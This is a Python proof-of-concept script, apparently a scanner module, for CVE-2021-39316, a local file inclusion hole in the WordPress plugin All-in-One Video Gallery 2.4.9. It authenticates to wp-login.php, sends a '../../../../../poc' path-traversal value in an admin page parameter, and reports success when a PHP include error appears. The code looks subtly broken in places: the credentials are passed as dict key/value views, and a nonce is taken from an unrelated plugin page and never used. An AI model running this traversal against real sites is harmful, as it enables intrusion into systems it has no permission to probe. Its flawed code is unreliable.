# coding: utf-8
import requests
import random

#WordPress Plugin All-in-One Video Gallery plugin 2.4.9 - Local File Inclusion
def poc(url,logindict,user_agent,proxy):

    url = url.strip("/")
    # Authentication:
    session = requests.Session()
    auth_url=url+'/wp-login.php'
    redirecto = url + "/wp-admin/"
    username=logindict.keys()
    password=logindict.values()
    header = {'User-Agent': user_agent}
    data = {'log': username, 'pwd': password, 'wp-submit': 'Log In', 'redirect_to': redirecto, 'testcookie': '1'}
    if proxy:
        proxies = {
            "http": "http://%(proxy)s/" % {'proxy': proxy},
            "https": "http://%(proxy)s/" % {'proxy': proxy}
        }
        auth  = session.post(auth_url, headers=header, data=data, proxies=proxies, timeout=5)
    else:
        auth  = session.post(auth_url, headers=header, data=data, timeout=5)

    # Get Security nonce value:
    check = session.get(url+ '/wp-admin/themes.php?page=catch-themes-demo-import').text
    nonce = check[check.find('ajax_nonce"') + 13:]
    wp_nonce = nonce[:nonce.find('"')]

    # 漏洞位置
    exploit_url = url + '/wp-admin/admin.php?page=all-in-one-video-gallery&tab=../../../../../poc'
    if proxy:
        proxies = {
            "http": "http://%(proxy)s/" % {'proxy': proxy},
            "https": "http://%(proxy)s/" % {'proxy': proxy}
        }
        response = session.get(exploit_url, headers=header, proxies=proxies)
    else:
        response = session.get(exploit_url, headers=header)
    # with open('../../data/b.html','wb') as f:
    #     f.write(response.content)
    if response.status_code==200:
        if "require_once()" in response.text and \
        "all-in-one-video-gallery/admin/partials/../../../../../poc.php): failed to open stream: No such file or directory in" in response.text\
                 and "此站点遇到了致命错误，请查看您站点管理员电子邮箱中收到的邮件来获得指引" in response.text:
            return 'WordPress Plugin All-in-One Video Gallery plugin 2.4.9文件包含漏洞    漏洞编号：CVE-2021-39316'


def run(url,logindict,user_agent,proxies):
    if logindict:
        result = poc(url,logindict,user_agent,proxies)
        return result

# run("http://192.168.220.128/Wordpress/wordpress-5.8.2-zh_CN/",{'admin':'admin'},'','')

